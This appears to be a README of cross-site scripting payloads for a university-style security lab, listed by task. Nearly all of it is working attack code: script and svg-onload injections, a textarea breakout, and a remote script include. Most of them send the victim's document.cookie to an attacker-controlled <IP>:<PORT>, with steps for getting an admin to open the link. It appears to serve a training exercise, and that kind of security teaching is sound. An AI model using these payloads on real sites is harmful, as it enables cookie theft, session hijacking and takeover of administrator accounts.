# Second Laboratory (XSS) Scripts

### Get Own Cookies On Search (Task 1.2):

```html
<script>
	document.write(document.cookie);
</script>
```

### Steal Admin's Cookies On Bug / Feature Report (Task 1.4):

```html
<script>
    const HTTP = new XMLHttpRequest();
    const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
    HTTP.open('GET', URL, false);
    HTTP.send();
</script>
```

- Search above Script
- Copy acquired Link
- Report it

### Steal Admin's Cookies On Bug / Feature Report Bypassing Simple WAF (Task 2.1):

```html
<svg onload="
    const HTTP = new XMLHttpRequest();
    const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
    HTTP.open('GET', URL, false);
    HTTP.send();
"></svg>
```

- Search above Script
- Copy acquired Link
- Report it

### Steal Admin's Cookies On BlogPosts Review (Task 3.2):

```html
</textarea>
    <script>
        const HTTP = new XMLHttpRequest();
        const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
        HTTP.open('GET', URL, false);
        HTTP.send();
    </script>
<textarea>
```

### Steal Admin's Cookies On BlogPosts Review Using Remote Scripts (Task 3.3):

```html
</textarea>
    <script src="http://<IP>:<PORT>/GetCookie.js"></script>
<textarea>
```
